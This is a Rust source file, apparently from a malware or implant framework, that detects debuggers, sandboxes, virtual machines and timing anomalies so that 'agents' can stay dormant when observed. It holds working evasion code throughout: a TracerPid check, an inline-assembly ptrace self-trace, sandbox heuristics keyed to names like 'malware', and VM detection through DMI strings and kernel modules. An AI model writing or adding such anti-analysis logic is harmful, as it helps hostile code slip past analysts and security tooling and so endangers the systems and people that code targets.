// Anti-analysis and anti-debugging techniques.
// Detects sandbox, debugger, and analysis environments.
// Used by agents to decide whether to activate or lie dormant.

use std::time::{Duration, Instant};
use tracing::warn;

/// Result of anti-analysis checks.
/// If any check triggers, the agent should NOT execute sensitive actions.
pub struct AntiAnalysis {
    pub is_debugged: bool,
    pub is_sandbox: bool,
    pub is_vm: bool,
    pub suspicious_timing: bool,
}

impl AntiAnalysis {
    /// Run all anti-analysis checks.
    /// Returns true if the environment appears safe.
    pub fn is_safe() -> bool {
        let checks = Self::run_checks();
        !checks.is_debugged && !checks.is_sandbox && !checks.is_vm && !checks.suspicious_timing
    }

    /// Run checks and return detailed results.
    pub fn run_checks() -> Self {
        let result = Self {
            is_debugged: check_debugger(),
            is_sandbox: check_sandbox(),
            is_vm: check_vm(),
            suspicious_timing: check_timing(),
        };

        if result.is_debugged {
            warn!("Anti-analysis: debugger detected");
        }
        if result.is_sandbox {
            warn!("Anti-analysis: sandbox detected");
        }
        if result.is_vm {
            warn!("Anti-analysis: VM detected");
        }
        if result.suspicious_timing {
            warn!("Anti-analysis: suspicious timing");
        }

        result
    }
}

// ── Debugger detection ───────────────────────────────────────────────────────

#[cfg(target_os = "linux")]
fn check_debugger() -> bool {
    // Check /proc/self/status for TracerPid
    if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
        for line in status.lines() {
            if line.starts_with("TracerPid:") {
                let pid: i32 = line.split_whitespace()
                    .nth(1)
                    .and_then(|s| s.parse().ok())
                    .unwrap_or(0);
                if pid != 0 {
                    return true;
                }
            }
        }
    }

    // Check via ptrace (self-debug attempt)
    #[cfg(target_arch = "x86_64")]
    {
        let ret = unsafe {
            let mut ret: i64;
            std::arch::asm!(
                "mov rax, 101",    // ptrace syscall
                "mov rdi, 0",      // PTRACE_TRACEME
                "xor rsi, rsi",
                "xor rdx, rdx",
                "xor r10, r10",
                "syscall",
                lateout("rax") ret,
                out("rdi") _, out("rsi") _, out("rdx") _, out("r10") _,
            );
            ret
        };
        if ret != 0 {
            return true; // ptrace failed = already being traced
        }
    }

    false
}

#[cfg(not(target_os = "linux"))]
fn check_debugger() -> bool {
    // Windows: IsDebuggerPresent(), NtQueryInformationProcess, etc.
    cfg!(debug_assertions) // fallback: debug builds hint at analysis
}

// ── Sandbox detection ────────────────────────────────────────────────────────

fn check_sandbox() -> bool {
    let mut indicators = 0u8;

    // Low screen resolution (common in sandboxes)
    // Skipped in headless environments

    // Check uptime (< 10 minutes suggests fresh sandbox)
    if let Ok(uptime) = std::fs::read_to_string("/proc/uptime") {
        let seconds: f64 = uptime.split_whitespace()
            .next()
            .and_then(|s| s.parse().ok())
            .unwrap_or(99999.0);
        if seconds < 600.0 {
            indicators += 1;
        }
    }

    // Check for common sandbox usernames
    if let Ok(user) = std::env::var("USER") {
        let lowers = user.to_lowercase();
        if lowers.contains("sandbox") || lowers.contains("malware") || lowers.contains("virus")
            || lowers.contains("test") || lowers == "user"
        {
            indicators += 1;
        }
    }

    // Check CPU cores (1 core = likely sandbox)
    let cores = num_cpus();
    if cores < 2 {
        indicators += 1;
    }

    // Check RAM (< 2GB = likely sandbox)
    if let Ok(meminfo) = std::fs::read_to_string("/proc/meminfo") {
        for line in meminfo.lines() {
            if line.starts_with("MemTotal:") {
                let kb: u64 = line.split_whitespace()
                    .nth(1)
                    .and_then(|s| s.parse().ok())
                    .unwrap_or(99999999);
                if kb < 2048000 { // < 2GB
                    indicators += 1;
                }
                break;
            }
        }
    }

    indicators >= 3
}

// ── VM detection ─────────────────────────────────────────────────────────────

#[cfg(target_os = "linux")]
fn check_vm() -> bool {
    // Check DMI product name
    if let Ok(product) = std::fs::read_to_string("/sys/class/dmi/id/product_name") {
        let lowers = product.to_lowercase();
        for vm_marker in &["virtualbox", "vmware", "qemu", "kvm", "xen", "hyper-v", "parallels"] {
            if lowers.contains(vm_marker) {
                return true;
            }
        }
    }

    // Check CPU info for hypervisor flag
    if let Ok(cpuinfo) = std::fs::read_to_string("/proc/cpuinfo") {
        if cpuinfo.contains("hypervisor") {
            return true;
        }
    }

    // Check kernel modules for VM drivers
    if let Ok(modules) = std::fs::read_to_string("/proc/modules") {
        for vm_mod in &["vboxguest", "vboxsf", "vmw_balloon", "vmwgfx",
                         "virtio", "xen_blkfront", "hv_vmbus"] {
            if modules.contains(vm_mod) {
                return true;
            }
        }
    }

    false
}

#[cfg(not(target_os = "linux"))]
fn check_vm() -> bool {
    false // Windows VM checks via WMI/CPUID
}

// ── Timing analysis detection ────────────────────────────────────────────────

fn check_timing() -> bool {
    // rdtsc timing check - if instructions execute too fast (hooked/emulated)
    let start = Instant::now();
    let _ = (0..1000).fold(0u64, |acc, x| acc.wrapping_mul(x).wrapping_add(1));
    let elapsed = start.elapsed();

    // If 1000 simple ops take >100ms, something is slowing us (debugger single-step?)
    // If <1us, might be emulated/hyper-accelerated (sandbox)
    elapsed > Duration::from_millis(100) || elapsed < Duration::from_nanos(1000)
}

// ── Helper ───────────────────────────────────────────────────────────────────

fn num_cpus() -> usize {
    if let Ok(cpuinfo) = std::fs::read_to_string("/proc/cpuinfo") {
        cpuinfo.lines().filter(|l| l.starts_with("processor")).count()
    } else {
        1
    }
}
